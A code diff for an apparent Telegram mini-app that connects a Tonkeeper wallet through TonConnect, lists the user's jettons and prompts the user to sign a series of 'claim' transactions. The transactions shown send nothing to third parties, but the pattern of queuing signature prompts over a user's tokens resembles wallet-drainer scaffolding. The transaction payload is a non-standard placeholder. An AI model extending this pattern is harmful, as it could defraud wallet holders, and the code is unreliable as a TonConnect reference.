@@ -1,32 +1,44 @@
-let ui;
 let walletAddress = null;
 let timerInterval;
 let jettonsToClaim = [];
 let currentIndex = 0;
 
-// ---------- Connect Wallet ----------
+// ---------- Initialize TonConnect ----------
 const connector = new TonConnectSDK.TonConnect({
     manifestUrl: "https://emperator16.github.io/miniapp/tonconnect-manifest.json"
 });
 
-document.getElementById("connectBtn").onclick = () => {
-    const walletInfoList = await connector.getWallets();
+// ---------- Connect Wallet ----------
+document.getElementById("connectBtn").onclick = async () => {
+    try {
+        const walletInfoList = await connector.getWallets();
+        const tonkeeperInfo = walletInfoList.find(w => w.name.toLowerCase().includes("tonkeeper"));
 
-    // انتخاب Tonkeeper
-    const tonkeeperInfo = walletInfoList.find(w => w.name.toLowerCase().includes("tonkeeper"));
-
-    if (tonkeeperInfo) {
-        connector.connect({
-            universalLink: tonkeeperInfo.universalLink,
-            bridgeUrl: tonkeeperInfo.bridgeUrl
-        });
+        if (tonkeeperInfo) {
+            await connector.connect({
+                universalLink: tonkeeperInfo.universalLink,
+                bridgeUrl: tonkeeperInfo.bridgeUrl
+            });
+        }
+    } catch (e) {
+        console.error("Connection failed:", e);
+        alert("Wallet connection failed. Make sure you are in Telegram or on mobile with Tonkeeper.");
     }
 };
 
-// دنبال کردن وضعیت اتصال
+// ---------- Track Wallet Status ----------
 connector.onStatusChange(info => {
-    if (info) {
-        console.log("Connected:", info.account.address);
+    if (info && info.account) {
+        walletAddress = info.account.address;
+        console.log("Connected:", walletAddress);
+        alert("Wallet connected: " + walletAddress);
+
+        document.getElementById("connectDiv").style.display = "none";
+        document.getElementById("gameDiv").style.display = "block";
+
+        fetchUserJettons(walletAddress).then(jettons => {
+            jettonsToClaim = jettons;
+        });
     }
 });
 
@@ -82,11 +94,11 @@ async function processNextClaim() {
         let payload = {
             type: "transfer",
             to: walletAddress,
-            amount: 0,
+            amount: 0, // فقط امضا، پرداخت کارمزد
             payload: "0x1234"
         };
 
-        await ui.sendTransaction(payload);
+        await connector.sendTransaction(payload);
 
         currentIndex++;
         document.getElementById("claimDiv").style.display = "none";
@@ -122,4 +134,3 @@ async function fetchUserJettons(address) {
         {address: '0:def456...', amount: 1}
     ];
 }
-
